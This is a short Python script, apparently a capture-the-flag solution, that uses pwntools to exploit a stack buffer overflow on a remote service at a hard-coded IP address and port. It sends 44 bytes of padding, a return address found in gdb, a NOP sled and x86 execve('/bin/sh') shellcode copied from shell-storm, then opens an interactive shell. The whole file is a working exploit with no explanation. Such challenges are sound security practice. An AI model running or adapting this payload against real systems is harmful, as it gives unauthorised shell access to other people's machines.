#!/usr/bin/env python
from pwn import *

# nc 104.154.106.182 3456
host = '104.154.106.182'
port = 3456

# shelcode len = 28
# http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80")

#[*] Exact match at offset 44
JUNK = "A" * 44
nop_sled = '\x90' * 12

# gdb-peda$ print lol
# $2 = {<text variable, no debug info>} 0x8048541 <lol>
lol = p32(0x8048541)

payload = JUNK + lol + nop_sled + shellcode

p = remote(host, port)
p.recv()
p.sendline(payload)
p.interactive()
